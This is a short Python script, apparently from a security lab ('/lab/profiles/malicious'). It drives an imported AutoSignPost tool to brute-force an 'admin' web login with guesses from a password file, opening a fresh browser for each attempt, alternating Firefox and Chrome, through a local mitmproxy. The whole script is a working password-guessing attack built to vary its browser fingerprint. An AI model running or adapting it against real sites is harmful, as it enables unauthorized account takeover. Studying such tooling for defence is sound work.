"""
Runs the authors' loginB (a fresh browser per password, Firefox and Chrome alternating) through their mitmproxy setting.
"""

import sys

sys.path.insert(0, "/lab/profiles/malicious")
from selenium import webdriver  # noqa: E402
from AutoSignPost import AutoSignPost  # noqa: E402

webdriver.DesiredCapabilities.FIREFOX["acceptInsecureCerts"] = True


def main(url: str, passwords: str, attempts: int, start: int) -> None:
    guesses = [line.strip() for line in open(passwords) if line.strip()][start:start + attempts]
    tool = AutoSignPost(PROXY="localhost:8080")
    for number, password in enumerate(guesses, start=start):
        try:
            tool.loginB(url, "admin", password, "firefox" if number % 2 == 0 else "chrome")
        except Exception as error:
            print("attempt failed:", type(error).__name__)


if __name__ == "__main__":
    main(sys.argv[1], sys.argv[2], int(sys.argv[3]), int(sys.argv[4]))
